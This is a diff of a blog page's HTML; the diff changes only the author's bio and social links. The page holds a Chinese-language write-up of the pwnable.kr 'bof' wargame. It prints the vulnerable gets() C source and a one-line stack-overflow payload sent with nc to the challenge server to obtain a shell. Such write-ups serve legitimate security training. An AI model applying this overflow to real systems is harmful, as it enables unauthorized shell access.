@@ -19,7 +19,7 @@
             <link rel="alternate" type="application/rss+xml" title="RSS" href="/rss2.xml">
         
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Theo Chen","sameAs":["https://github.com/TheoKlein","https://twitter.com/The0_Klein","https://www.facebook.com/profile.php?id=100009076420659","https://www.linkedin.com/in/theo-chen/","mailto:theokleintw@gmail.com"],"image":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176"},"articleBody":"Nana told me that buffer overflow is one of the most common software vulnerability.Is that true?\n\n\n題目有給C的原始碼：\n123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key)&#123;\tchar overflowme[32];\tprintf(&quot;overflow me : &quot;);\tgets(overflowme);\t// smash me!\tif(key == 0xcafebabe)&#123;\t\tsystem(&quot;/bin/sh&quot;);\t&#125;\telse&#123;\t\tprintf(&quot;Nah..\\n&quot;);\t&#125;&#125;int main(int argc, char* argv[])&#123;\tfunc(0xdeadbeef);\treturn 0;&#125;\n\n唯一可控的只有輸入的overflowme，得想辦利用buffer overflow蓋掉key的值使得第八行的判斷能夠成立。\n丟進IDA Pro看func的部分：\n根據組合語言，我畫出了這張stack圖幫助我理解：\n雖然overflowme只配置了32 bytes的空間，但使用了gets()使得輸入的長度沒有限制，-0x2C到0x08之間總共有52 bytes的空間，只要把這部分塞滿就可以進一步將key的位址0x08覆蓋成我們希望的值，payload建構如下（要注意是little endian）：\n12345678910$ (python -c &#x27;print &quot;a&quot; * 52 + &quot;\\xbe\\xba\\xfe\\xca&quot;&#x27;; cat -) | nc pwnable.kr 9000lsbofbof.cflagloglog2super.plcat flagdaddy, I just pwned a buFFer :)","dateCreated":"2017-07-13T16:19:55+00:00","dateModified":"2022-12-10T18:57:10+00:00","datePublished":"2017-07-13T16:19:55+00:00","description":"Nana told me that buffer overflow is one of the most common software vulnerability.Is that true?","headline":"pwnable.kr #bof","image":["pwnablekr.jpg"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.theo.com.tw/Writeups/pwnable-kr/pwnable-kr-bof/"},"publisher":{"@type":"Organization","name":"Theo Chen","sameAs":["https://github.com/TheoKlein","https://twitter.com/The0_Klein","https://www.facebook.com/profile.php?id=100009076420659","https://www.linkedin.com/in/theo-chen/","mailto:theokleintw@gmail.com"],"image":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176","logo":{"@type":"ImageObject","url":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176"}},"url":"https://blog.theo.com.tw/Writeups/pwnable-kr/pwnable-kr-bof/","keywords":"Writeups","thumbnailUrl":"pwnablekr.jpg"}</script>
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Theo Chen","sameAs":["https://github.com/TheoKlein","https://twitter.com/The0_Klein","https://www.linkedin.com/in/theo-chen/","mailto:theokleintw@gmail.com"],"image":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176"},"articleBody":"Nana told me that buffer overflow is one of the most common software vulnerability.Is that true?\n\n\n題目有給C的原始碼：\n123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key)&#123;\tchar overflowme[32];\tprintf(&quot;overflow me : &quot;);\tgets(overflowme);\t// smash me!\tif(key == 0xcafebabe)&#123;\t\tsystem(&quot;/bin/sh&quot;);\t&#125;\telse&#123;\t\tprintf(&quot;Nah..\\n&quot;);\t&#125;&#125;int main(int argc, char* argv[])&#123;\tfunc(0xdeadbeef);\treturn 0;&#125;\n\n唯一可控的只有輸入的overflowme，得想辦利用buffer overflow蓋掉key的值使得第八行的判斷能夠成立。\n丟進IDA Pro看func的部分：\n根據組合語言，我畫出了這張stack圖幫助我理解：\n雖然overflowme只配置了32 bytes的空間，但使用了gets()使得輸入的長度沒有限制，-0x2C到0x08之間總共有52 bytes的空間，只要把這部分塞滿就可以進一步將key的位址0x08覆蓋成我們希望的值，payload建構如下（要注意是little endian）：\n12345678910$ (python -c &#x27;print &quot;a&quot; * 52 + &quot;\\xbe\\xba\\xfe\\xca&quot;&#x27;; cat -) | nc pwnable.kr 9000lsbofbof.cflagloglog2super.plcat flagdaddy, I just pwned a buFFer :)","dateCreated":"2017-07-13T16:19:55+00:00","dateModified":"2022-12-10T18:57:10+00:00","datePublished":"2017-07-13T16:19:55+00:00","description":"Nana told me that buffer overflow is one of the most common software vulnerability.Is that true?","headline":"pwnable.kr #bof","image":["pwnablekr.jpg"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.theo.com.tw/Writeups/pwnable-kr/pwnable-kr-bof/"},"publisher":{"@type":"Organization","name":"Theo Chen","sameAs":["https://github.com/TheoKlein","https://twitter.com/The0_Klein","https://www.linkedin.com/in/theo-chen/","mailto:theokleintw@gmail.com"],"image":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176","logo":{"@type":"ImageObject","url":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176"}},"url":"https://blog.theo.com.tw/Writeups/pwnable-kr/pwnable-kr-bof/","keywords":"Writeups","thumbnailUrl":"pwnablekr.jpg"}</script>
     
     <meta name="description" content="Nana told me that buffer overflow is one of the most common software vulnerability.Is that true?">
 <meta property="og:type" content="blog">
@@ -122,7 +122,7 @@
                 </a>
                 <h4 class="sidebar-profile-name">Theo Chen</h4>
                 
-                    <h5 class="sidebar-profile-bio"><p>Penetration Testing &#x2F; Malware Analysis &#x2F; Threat Hunting<br /><br />Ingress Enlightened Agent</p>
+                    <h5 class="sidebar-profile-bio"><p>Penetration Testing &#x2F; Malware Analysis &#x2F; Threat Hunting &#x2F; APT Research<br /><br />Ingress Enlightened Agent</p>
 </h5>
                 
             </div>
@@ -233,22 +233,6 @@
                         >
                         <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
                         <span class="sidebar-button-desc">Twitter</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://www.facebook.com/profile.php?id=100009076420659"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Facebook"
-                        >
-                        <i class="sidebar-button-icon fab fa-facebook" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Facebook</span>
                     </a>
             </li>
             
@@ -633,7 +617,7 @@
         
             <h4 id="about-card-name">Theo Chen</h4>
         
-            <div id="about-card-bio"><p>Penetration Testing &#x2F; Malware Analysis &#x2F; Threat Hunting<br /><br />Ingress Enlightened Agent</p>
+            <div id="about-card-bio"><p>Penetration Testing &#x2F; Malware Analysis &#x2F; Threat Hunting &#x2F; APT Research<br /><br />Ingress Enlightened Agent</p>
 </div>
         
         
